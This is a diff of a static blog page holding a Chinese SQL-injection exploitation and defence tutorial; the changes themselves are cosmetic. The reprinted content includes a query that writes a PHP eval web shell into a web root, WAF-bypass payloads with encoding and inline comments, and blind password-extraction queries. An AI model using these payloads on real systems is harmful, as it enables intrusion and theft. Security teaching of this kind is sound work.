@@ -109,7 +109,7 @@
 <meta property="og:image" content="http://yoursite.com/blog/sql-injection/payload.png">
 <meta property="og:image" content="http://yoursite.com/blog/sql-injection/smb.png">
 <meta property="og:image" content="http://yoursite.com/blog/sql-injection/http.png">
-<meta property="og:updated_time" content="2018-01-21T03:05:07.000Z">
+<meta property="og:updated_time" content="2021-08-24T13:42:26.023Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL Injection 利用与防御">
 <meta name="twitter:description" content="SQL知识注释方式SQL中使用#、--␠(␠代表空格的意思)、/* */作为注释，前两者表示此符号之后的本行无效，后者是直到匹配为止。注意有些浏览器在url输入#是需要改成%23不然按回车不会访问。 连接符MySQL使用+作为连接符，例如:1SELECT count(*) FROM test WHERE name=&apos;te&apos;+&apos;st&apos; 内置数据库、表数据库中一般会内置一些databases和tabl">
@@ -389,8 +389,8 @@
               
                 <span class="post-meta-item-text">Post modified</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2018-01-21T11:05:07+08:00">
-                2018-01-21
+              <time title="Post modified" itemprop="dateModified" datetime="2021-08-24T21:42:26+08:00">
+                2021-08-24
               </time>
             
           </span>
@@ -608,9 +608,9 @@
 </blockquote>
 <p>可以看出，这个可以将文件内容读入，但是要求有<code>FILE</code>权限且不超过最大允许大小。<br>注意一下，<strong>MySQL有一个<code>secure_file_priv</code>字段，会限制读取和写入的文件路径，只有这个字段包含的路径才允许读入或写入，且数据库当前用户有FILE权限以及必须有相应文件的读写权限</strong></p>
 <ul>
-<li><code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code>不允许导入|导出. </li>
-<li>当<code>secure_file_priv</code>的值为<code>/tmp/</code>，表示限制<code>mysqld</code>的导入|导出只能发生在<code>/tmp/</code>目录下. </li>
-<li>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code>的导入|导出做限制. </li>
+<li><code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code>不允许导入|导出.</li>
+<li>当<code>secure_file_priv</code>的值为<code>/tmp/</code>，表示限制<code>mysqld</code>的导入|导出只能发生在<code>/tmp/</code>目录下.</li>
+<li>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code>的导入|导出做限制.</li>
 </ul>
 <p>注意 这个<code>FILE</code>权限是全局的(<code>level=Global</code>)</p>
 <blockquote>
@@ -630,7 +630,7 @@
 <p>区别在上面，可以自己试一下：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/tmp/test'</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">USER</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'/tmp/test'</span></div></pre></td></tr></table></figure>
 <p>两个经典的<code>outfile</code>:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'D:/phpstudy/WWW/index2.php'</span> </div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> a <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'D:/phpstudy/WWW/index2.php'</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'D:/phpstudy/WWW/index2.php'</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> a <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'D:/phpstudy/WWW/index2.php'</span></div></pre></td></tr></table></figure>
 <p>之后只要<code>POST</code>php代码即可执行任意内容。</p>
 <h4 id="MD5处理后字段"><a href="#MD5处理后字段" class="headerlink" title="MD5处理后字段"></a>MD5处理后字段</h4><p>利用的php<code>md5(str,raw_output=true)</code>输出的<code>RAW MD5</code>进行注入。在另一篇<code>hackinglab writeup</code>中已经进行了详细的讲解和分析，具体可以看<a href="https://hellohxk.com/blog/hackinglab-writeup/#9-%E6%8D%AE%E8%AF%B4%E5%93%88%E5%B8%8C%E5%90%8E%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%B8%8D%E8%83%BD%E4%BA%A7%E7%94%9F%E6%B3%A8%E5%85%A5%E7%9A%84" target="_blank" rel="external">这里</a>的注入关最后一题。</p>
 <h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p>带外通道攻击主要是<strong>利用其他协议或者渠道从服务器提取数据</strong>。它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.<br>条件限制:<br>这些函数是需要绝对路径的，以及<code>FILE</code>权限</p>
@@ -644,7 +644,7 @@
 <p>Out-of-band (OOB)技术，与inband相反，使用其它传输信道获取数据，例如超文本传输协议和DNS解析协议。当详细的错误信息被禁用、结果被限制或过滤、出站过滤规则不严和/或当减少查询的数目变得极度重要时inference技术看起来像是唯一的选择，这时使用OOB技术渗透便变得十分有趣。例如，基于HTTP的OOB技术的SQL查询结果变成了发送给HTTP服务器请求的一部分（例如GET参数值）被能访问日志文件的攻击者控制时。此类的技术不像其它的主流技术被广泛应用，主要是其所需的设置非常复杂，但使用它们可以克服许多障碍（如避免不必要的数据库写入和极大地提升利用INSERT/UPDATE语句漏洞的基于时间的SQLI）。</p>
 </blockquote>
 <p><strong>如果能找到引起DNS解析的函数，均可以达成目的，不止以下这种<code>UNC</code>方式。</strong></p>
-<p>还有一个知识就是<code>UNC(Universal-Naming-Convention)</code> </p>
+<p>还有一个知识就是<code>UNC(Universal-Naming-Convention)</code></p>
 <blockquote>
 <p>The Universal Naming Convention (UNC) is the naming system used in Microsoft Windows for accessing shared network folders and printers on a local area network (LAN).</p>
 </blockquote>
@@ -755,19 +755,19 @@
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE TABLE users (</div><div class="line"><span class="code">    -&gt;   username varchar(25),</span></div><div class="line"><span class="code">    -&gt;   password varchar(25)</span></div><div class="line"><span class="code">    -&gt; );</span></div><div class="line">Query OK, 0 rows affected (0.09 sec)</div><div class="line">mysql&gt; INSERT INTO users</div><div class="line"><span class="code">    -&gt; VALUES('vampire', 'my_password');</span></div><div class="line">Query OK, 1 row affected (0.11 sec)</div><div class="line"><span class="section">mysql&gt; SELECT * FROM users;</span></div><div class="line">+----------+-------------+</div><div class="line"><span class="section">| username | password    |</span></div><div class="line">+----------+-------------+</div><div class="line"><span class="section">| vampire  | my_password |</span></div><div class="line">+----------+-------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; SELECT * FROM users</div><div class="line"><span class="section">    -&gt; WHERE username='vampire       ';</span></div><div class="line">+----------+-------------+</div><div class="line"><span class="section">| username | password    |</span></div><div class="line">+----------+-------------+</div><div class="line"><span class="section">| vampire  | my_password |</span></div><div class="line">+----------+-------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; SELECT * FROM users</div><div class="line"><span class="code">    -&gt; WHERE username='vampire                   1';</span></div><div class="line">Empty set (0.00 sec)</div></pre></td></tr></table></figure>
 <h4 id="WAF-常见绕过方式"><a href="#WAF-常见绕过方式" class="headerlink" title="WAF 常见绕过方式"></a>WAF 常见绕过方式</h4><p>原文章地址:这里<a href="http://drops.wooyun.org/tips/968" target="_blank" rel="external">SQL注入绕过waf和过滤机制</a><br>WAF(Web Application Firewall)总体来说具有以下功能:</p>
 <ol>
-<li>审计设备用来截获所有HTTP数据或者仅仅满足某些规则的会话 </li>
-<li>访问控制设备用来控制对Web应用的访问既包括主动安全模式也包括被动安全模式 </li>
-<li>架构/网络设计工具当运行在反向代理模式他们被用来分配职能集中控制虚拟基础结构等。 </li>
-<li>WEB应用加固工具这些功能增强被保护Web应用的安全性它不仅能够屏蔽WEB应用固有弱点而且能够保护WEB应用编程错误导致的安全隐患。 </li>
+<li>审计设备用来截获所有HTTP数据或者仅仅满足某些规则的会话</li>
+<li>访问控制设备用来控制对Web应用的访问既包括主动安全模式也包括被动安全模式</li>
+<li>架构/网络设计工具当运行在反向代理模式他们被用来分配职能集中控制虚拟基础结构等。</li>
+<li>WEB应用加固工具这些功能增强被保护Web应用的安全性它不仅能够屏蔽WEB应用固有弱点而且能够保护WEB应用编程错误导致的安全隐患。</li>
 </ol>
 <p>常见特点:</p>
 <ul>
-<li>异常检测协议拒绝不符合HTTP标准的请求 </li>
-<li>增强的输入验证代理和服务端的验证而不只是限于客户端验证 </li>
-<li>白名单&amp;黑名单白名单适用于稳定的We应用黑名单适合处理已知问题 </li>
-<li>基于规则和基于异常的保护基于规则更多的依赖黑名单机制基于异常更为灵活 </li>
-<li>状态管理重点进行会话保护 </li>
-<li>另还有Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 </li>
+<li>异常检测协议拒绝不符合HTTP标准的请求</li>
+<li>增强的输入验证代理和服务端的验证而不只是限于客户端验证</li>
+<li>白名单&amp;黑名单白名单适用于稳定的We应用黑名单适合处理已知问题</li>
+<li>基于规则和基于异常的保护基于规则更多的依赖黑名单机制基于异常更为灵活</li>
+<li>状态管理重点进行会话保护</li>
+<li>另还有Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</li>
 </ul>
 <p>如果对于扫描器WAF有:</p>
 <ol>
@@ -780,32 +780,32 @@
 </ol>
 <p>原文总结了9中绕过方法:</p>
 <ul>
-<li>大小写混合 </li>
-<li>替换关键字 </li>
-<li>使用编码 </li>
-<li>使用注释 </li>
-<li>等价函数与命令 </li>
-<li>使用特殊符号 </li>
-<li>HTTP参数控制 </li>
-<li>缓冲区溢出 </li>
-<li>整合绕过 </li>
+<li>大小写混合</li>
+<li>替换关键字</li>
+<li>使用编码</li>
+<li>使用注释</li>
+<li>等价函数与命令</li>
+<li>使用特殊符号</li>
+<li>HTTP参数控制</li>
+<li>缓冲区溢出</li>
+<li>整合绕过</li>
 </ul>
 <p>有些之前提到过的方法不在赘述，这里主要补充一些。</p>
 <h5 id="编码替换"><a href="#编码替换" class="headerlink" title="编码替换"></a>编码替换</h5><p>URL多次编码，用于只进行了一次解码过滤的</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">page.php?id=<span class="number">1</span>%<span class="number">252</span>f%<span class="number">252</span>a*/UNION%<span class="number">252</span>f%<span class="number">252</span>a/SELECT </div><div class="line"></div><div class="line">解码<span class="number">1</span>次：</div><div class="line">page.php?id=<span class="number">1</span>%<span class="number">2</span>f%<span class="number">2</span>a*/UNION%<span class="number">2</span>f%<span class="number">2</span>a/SELECT </div><div class="line">解码<span class="number">2</span>次：</div><div class="line">page.php?id=<span class="number">1</span><span class="comment">/**/</span>UNION<span class="comment">/*/SELECT</span></div></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">page.php?id=<span class="number">1</span>%<span class="number">252</span>f%<span class="number">252</span>a*/UNION%<span class="number">252</span>f%<span class="number">252</span>a/SELECT</div><div class="line"></div><div class="line">解码<span class="number">1</span>次：</div><div class="line">page.php?id=<span class="number">1</span>%<span class="number">2</span>f%<span class="number">2</span>a*/UNION%<span class="number">2</span>f%<span class="number">2</span>a/SELECT</div><div class="line">解码<span class="number">2</span>次：</div><div class="line">page.php?id=<span class="number">1</span><span class="comment">/**/</span>UNION<span class="comment">/*/SELECT</span></div></pre></td></tr></table></figure>
 <h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><p>常见注释:</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">//</span>, -- , <span class="regexp">/**/</span>, <span class="comment">#, --+,--  -, ;--a</span></div></pre></td></tr></table></figure>
 <p>后几个表示此行之后无效</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">z.com/index.php?page_id=<span class="number">-15</span> %<span class="number">55</span>nION<span class="comment">/**/</span>%<span class="number">53</span>ElecT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></div><div class="line">'union%a0select pass from users#</div></pre></td></tr></table></figure>
 <p><strong>内联注释：</strong> 只有MySQL中才能正常识别</p>
 <p><code>/*!content*/</code> MySQL会识别出正常的内容</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">index.php?page_id=<span class="number">-15</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> </div><div class="line">?page_id=null%<span class="number">0</span>A<span class="comment">/**/</span><span class="comment">/*!50000%55nIOn*/</span><span class="comment">/*yoyu*/</span>all<span class="comment">/**/</span>%<span class="number">0</span>A<span class="comment">/*!%53eLEct*/</span>%<span class="number">0</span>A<span class="comment">/*nnaa*/</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>…</div></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">index.php?page_id=<span class="number">-15</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></div><div class="line">?page_id=null%<span class="number">0</span>A<span class="comment">/**/</span><span class="comment">/*!50000%55nIOn*/</span><span class="comment">/*yoyu*/</span>all<span class="comment">/**/</span>%<span class="number">0</span>A<span class="comment">/*!%53eLEct*/</span>%<span class="number">0</span>A<span class="comment">/*nnaa*/</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>…</div></pre></td></tr></table></figure>
 <p><strong>这是最为常用的绕过方式！！</strong></p>
 <h5 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h5><p>有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用</p>
 <p>函数或变量：</p>
 <figure class="highlight erlang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">hex</span><span class="params">()</span>、<span class="title">bin</span><span class="params">()</span> ==&gt; <span class="title">ascii</span><span class="params">()</span></span></div><div class="line"><span class="title">sleep</span><span class="params">()</span> ==&gt;<span class="title">benchmark</span><span class="params">()</span></div><div class="line"><span class="title">concat_ws</span><span class="params">()</span>==&gt;<span class="title">group_concat</span><span class="params">()</span></div><div class="line"><span class="title">mid</span><span class="params">()</span>、<span class="title">substr</span><span class="params">()</span> ==&gt; <span class="title">substring</span><span class="params">()</span></div><div class="line">@@<span class="title">user</span> ==&gt; <span class="title">user</span><span class="params">()</span></div><div class="line">@@<span class="title">datadir</span> ==&gt; <span class="title">datadir</span><span class="params">()</span></div></pre></td></tr></table></figure>
 <p>例如:</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>+and+ascii(lower(mid((select+pwd+from+users+limit+<span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">74</span>　 </div><div class="line"></div><div class="line">substr((select 'password'),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span> </div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x69</span>) = <span class="number">1</span> </div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x70</span>) = <span class="number">0</span> </div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x71</span>) = <span class="number">-1</span></div></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>+and+ascii(lower(mid((select+pwd+from+users+limit+<span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">74</span>　</div><div class="line"></div><div class="line">substr((select 'password'),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x69</span>) = <span class="number">1</span></div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x70</span>) = <span class="number">0</span></div><div class="line">strcmp(left('password',<span class="number">1</span>), <span class="number">0x71</span>) = <span class="number">-1</span></div></pre></td></tr></table></figure>
 <h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.使用反引号`，例如<span class="keyword">select</span> <span class="string">`version()`</span>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</div><div class="line"><span class="number">2.</span>神奇的<span class="string">"-+."</span>，<span class="keyword">select</span>+<span class="keyword">id</span><span class="number">-1</span>+<span class="number">1.</span><span class="keyword">from</span> <span class="keyword">users</span>; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</div><div class="line">3.@符号，<span class="keyword">select</span>@^<span class="number">1.</span><span class="keyword">from</span> <span class="keyword">users</span>; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</div><div class="line">4.Mysql function() as xxx  也可不用as和空格　　 <span class="keyword">select</span>-<span class="keyword">count</span>(<span class="keyword">id</span>)<span class="keyword">test</span> <span class="keyword">from</span> <span class="keyword">users</span>;  //绕过空格限制</div></pre></td></tr></table></figure>
 <p>部分可能发挥作用的字符:</p>
 <figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`、~、!、@、<span class="meta">%</span>、<span class="comment">()</span>、[]、.、-、+ 、|、<span class="meta">%</span><span class="number">00</span></div></pre></td></tr></table></figure>
@@ -868,7 +868,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/security/" rel="tag"><i class="fa fa-tag"></i> security</a>
+            <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
           
             <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
           
@@ -988,7 +988,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -999,7 +999,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">17</span>
                 <span class="site-state-item-name">categories</span>
               </a>
             </div>
@@ -1010,7 +1010,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-count">69</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
